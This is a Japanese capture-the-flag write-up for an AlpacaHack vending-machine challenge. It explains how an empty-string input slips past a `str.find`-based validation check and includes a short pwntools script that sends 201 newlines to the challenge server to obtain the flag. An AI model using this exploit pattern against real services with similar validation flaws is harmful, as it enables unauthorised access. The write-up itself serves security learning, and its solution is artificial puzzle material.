# ■ Vending Machine: Revised Version
[Vending Machine: Revised Version - AlpacaHack](https://alpacahack.com/daily/challenges/vending-machine-revised-version)

## 1. Writeup

```python:server.py
25     def buy(self, mark:str):
26         # check choice
27 # 2026.09.05 Cleaned up the implementation ------------------------- MOD Start
28 #        if mark not in ['a', 'b', 'c', 'd', 'e']: # No 'f'? Hmm...
29 # ------------------------------------------------------------------
30         if 'abcde'.find(mark) < 0: # No 'f'? Hmm...
31 # 2026.09.05 Cleaned up the implementation ------------------------- MOD End
32             print("Invalid choice.")
33             return
```

注目するコードブロックは上記.

```python
30         if 'abcde'.find(mark) < 0:
```

- `.find()`に`''`(空文字)を渡した時, `0`が戻る. (詳細略)

`VendingMachine.stock`は`'a'*30 + 'b'*60 + 'c'*20 + 'd'*50 + 'e'*40 + 'f'`で定義されてあることも考慮すると, `[a-e]`をすべて購入した後, 空文字`''`を送信することで変数`item`には`f`が入ることがわかる. 

> [!important]
> (冗長的説明)`[a-e]`をすべて購入した後, `VendingMachine.stock`に格納されているのは文字列`'f'`. `.find()`に空文字`''`を渡すと`0`が戻るので, 変数`loc`には`0`が, 変数`item`には`stock_list[0]`すなわち`f`が格納される.

また, つまるところ`[a-e]`を購入する際に送信する文字列は空文字`''`でもよい. 以上を踏まえて201回空文字を送信してフラグを取得する.

`solve.py:`
```python:solve.py
from pwn import *

HOST = "34.170.146.252"
PORT = 45305

io = remote(HOST, PORT)

def exploit():
	io.recvuntil(b"your choice> ")
	io.send(b"\n" * 201)
	io.interactive()

if __name__ == "__main__":
	exploit()

```

(書き方は異なるが本質は同意で, 改行を入力することで空文字を送信する.)
